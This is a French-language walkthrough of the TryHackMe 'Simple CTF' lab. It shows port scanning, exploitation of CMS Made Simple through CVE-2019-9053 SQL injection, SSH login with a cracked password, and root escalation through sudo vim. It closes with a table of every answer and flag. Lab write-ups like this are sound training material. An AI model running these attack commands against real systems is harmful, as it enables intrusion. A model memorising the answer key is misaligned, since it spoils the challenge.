# TryHackMe: Simple CTF

**Objectif :** enumerer les services exposes, exploiter CMS Made Simple via SQL injection pour recuperer des credentials, se connecter en SSH, puis obtenir un shell privilegie via `vim`.

---

## Introduction

**Simple CTF** est une excellente room pour debuter parce qu'elle oblige a suivre un enchainement classique :

1. scan des services
2. identification d'un CMS
3. exploitation d'une faille connue
4. reutilisation des credentials obtenus
5. privilege escalation simple mais realiste

Le challenge pose des questions concretes et attend des reponses tres directes. Je garde donc ce writeup au format question/reponse, tout en expliquant le raisonnement a chaque etape.

---

## Question 1: How many services are running under port 1000?

Je commence par scanner la machine :

```bash
nmap -sC -sV -p- <IP>
```

Services observes sous le port 1000 :

- `21/tcp` - FTP
- `80/tcp` - HTTP

Un autre service SSH est aussi present, mais il tourne sur un port superieur a 1000.

### Reponse

**Number of services under 1000:** `2`

---

## Question 2: What is running on the higher port?

Le scan montre un port haut ouvert :

```text
2222/tcp open ssh
```

### Reponse

**Service on the higher port:** `ssh`

---

## Question 3: What's the CVE you're using against the application?

### 1. Enumeration web

Je brute-force les repertoires :

```bash
gobuster dir -u http://<IP>/ -w /usr/share/wordlists/dirb/common.txt
```

Je trouve un repertoire utile :

```text
/simple/
```

Le site tourne sur **CMS Made Simple**.

### 2. Recherche de la faille

Je cherche un exploit correspondant :

```bash
searchsploit "CMS Made Simple"
```

La faille utilisee dans cette room est associee a :

```text
CVE-2019-9053
```

### Reponse

**CVE used:** `CVE-2019-9053`

---

## Question 4: To what kind of vulnerability is the application vulnerable?

`CVE-2019-9053` correspond a une **SQL injection** sur CMS Made Simple.

### Reponse

**Vulnerability type:** `sqli`

---

## Question 5: What's the password?

### 1. Exploitation

J'utilise l'exploit public correspondant :

```bash
python exploit.py -u http://<IP>/simple --crack -w /usr/share/wordlists/rockyou.txt
```

L'exploit extrait le hash puis le casse. Les credentials recuperes sont ceux de l'utilisateur `mitch`.

Mot de passe trouve :

```text
secret
```

### Reponse

**Password:** `secret`

---

## Question 6: Where can you login with the details obtained?

Le service web ne me donne pas de shell direct, donc je reutilise les credentials sur le service SSH expose sur le port `2222`.

Connexion :

```bash
ssh mitch@<IP> -p 2222
```

### Reponse

**Where can you login?** `ssh`

---

## Question 7: What's the user flag?

Une fois connecte en SSH :

```bash
cat user.txt
```

Contenu :

```text
G00d j0b, keep up!
```

### Reponse

**User flag:** `G00d j0b, keep up!`

---

## Question 8: Is there any other user in the home directory? What's its name?

Je regarde les homes disponibles :

```bash
cd /home
ls -la
```

Je vois un autre utilisateur en plus de `mitch` :

```text
sunbath
```

### Reponse

**Other user:** `sunbath`

---

## Question 9: What can you leverage to spawn a privileged shell?

Le bon reflexe apres un acces SSH :

```bash
sudo -l
```

Sortie utile :

```text
(root) NOPASSWD: /usr/bin/vim
```

Le binaire exploitable est donc :

```text
vim
```

### Reponse

**Leverage for privileged shell:** `vim`

---

## Question 10: What's the root flag?

### 1. Privilege escalation

Je m'appuie sur GTFOBins :

```bash
sudo vim -c ':!/bin/sh'
```

Une fois root :

```bash
cd /root
cat root.txt
```

Contenu :

```text
W3ll d0n3. You made it!
```

### Reponse

**Root flag:** `W3ll d0n3. You made it!`

---

## Recapitulatif des reponses

| Question | Reponse |
|----------|---------|
| How many services are running under port 1000? | `2` |
| What is running on the higher port? | `ssh` |
| What's the CVE you're using against the application? | `CVE-2019-9053` |
| To what kind of vulnerability is the application vulnerable? | `sqli` |
| What's the password? | `secret` |
| Where can you login with the details obtained? | `ssh` |
| What's the user flag? | `G00d j0b, keep up!` |
| Is there any other user in the home directory? What's its name? | `sunbath` |
| What can you leverage to spawn a privileged shell? | `vim` |
| What's the root flag? | `W3ll d0n3. You made it!` |

---

## Points cles a retenir

- Toujours chercher le nom exact du CMS avant d'essayer un exploit.
- Une SQLi sur CMS suffit souvent a sortir un hash puis des credentials.
- La reutilisation d'identifiants entre web et SSH est un grand classique.
- `sudo vim` est un cas GTFOBins tres standard, donc tres important a connaitre.

---

**Auteur :** Saad Idrissi
